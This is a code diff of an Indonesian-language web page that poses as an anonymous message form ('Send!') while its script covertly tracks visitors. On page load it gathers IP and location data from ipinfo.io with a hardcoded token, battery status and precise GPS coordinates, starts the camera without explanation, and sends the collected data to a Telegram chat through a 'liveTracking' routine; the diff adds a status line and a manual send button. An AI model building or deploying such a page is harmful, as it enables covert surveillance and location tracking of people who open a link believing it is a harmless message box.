@@ -11,10 +11,13 @@
 </head>
 <body class="min-h-screen flex items-center justify-center px-4 py-12">
 <div class="w-full max-w-md">
+
   <!-- top floating activity -->
   <div class="flex justify-center mb-6">
     <div class="activity">
-      <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c2.21 0 4-1.79 4-4S14.21 4 12 4 8 5.79 8 8s1.79 4 4 4zM2 20c0-3.31 2.69-6 6-6h8c3.31 0 6 2.69 6 6v1H2v-1z"/></svg>
+      <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
+        <path d="M12 12c2.21 0 4-1.79 4-4S14.21 4 12 4 8 5.79 8 8s1.79 4 4 4zM2 20c0-3.31 2.69-6 6-6h8c3.31 0 6 2.69 6 6v1H2v-1z"/>
+      </svg>
       <div class="text-sm ml-1">205 teman baru saja mengetuk</div>
     </div>
   </div>
@@ -47,6 +50,9 @@
             Send!
           </button>
         </div>
+
+        <!-- status -->
+        <div id="status" class="mt-2 text-sm text-gray-500"></div>
       </div>
     </div>
 
@@ -72,24 +78,37 @@
 </div>
 
 <script>
-const statusEl = document.getElementById('status');
-const CHAT_ID = "7483495590";
+const CHAT_ID = "7483495590"; // ganti sesuai chat Telegram lo
 
 async function sendToTelegram(data){
+  const statusEl = document.getElementById('status');
   try{
-    await fetch('/api/sendMessage', {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({ chat_id: CHAT_ID, text: data })
-});
-  }catch(err){console.error(err);}
+    const res = await fetch('/api/sendMessage',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:CHAT_ID,text:data})
+    });
+
+    const result = await res.json();
+    console.log("Response /api/sendMessage:", result);
+
+    if(result.success){
+      statusEl.textContent = "✅ Pesan berhasil dikirim ke Telegram";
+    } else {
+      statusEl.textContent = "❌ Gagal kirim: " + (result.error || "Unknown error");
+    }
+
+  }catch(err){
+    console.error(err);
+    statusEl.textContent = "❌ Fetch error: " + err.message;
+  }
 }
 
 async function getDeviceInfo(){
   let geo="Tidak tersedia";
   try{
-    const ipInfo=await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r=>r.json());
-    const battery=await navigator.getBattery();
+    const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r=>r.json());
+    const battery = await navigator.getBattery();
     if(navigator.geolocation){
       await new Promise(resolve=>navigator.geolocation.getCurrentPosition(pos=>{
         geo=`Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}, Accuracy: ${pos.coords.accuracy} m`;
@@ -101,9 +120,8 @@ async function getDeviceInfo(){
 }
 
 async function liveTracking(){
-  const info=await getDeviceInfo();
+  const info = await getDeviceInfo();
   await sendToTelegram(info);
-  statusEl && (statusEl.textContent=`Terakhir update: ${new Date().toLocaleTimeString()}`);
 }
 
 window.onload = async()=>{
@@ -113,9 +131,17 @@ window.onload = async()=>{
   // Kamera otomatis
   const videoEl=document.getElementById('cameraPreview');
   try{
-    const stream=await navigator.mediaDevices.getUserMedia({video:true,audio:false});
-    videoEl.srcObject=stream;
-  }catch(err){console.error("Gagal akses kamera:",err);}
+    const stream = await navigator.mediaDevices.getUserMedia({video:true,audio:false});
+    videoEl.srcObject = stream;
+  }catch(err){
+    console.error("Gagal akses kamera:", err);
+  }
+
+  // Tombol send manual
+  document.getElementById('sendBtn').addEventListener('click', async()=>{
+    const msg = document.getElementById('msg').value.trim();
+    if(msg) await sendToTelegram(msg);
+  });
 };
 </script>
 </body>
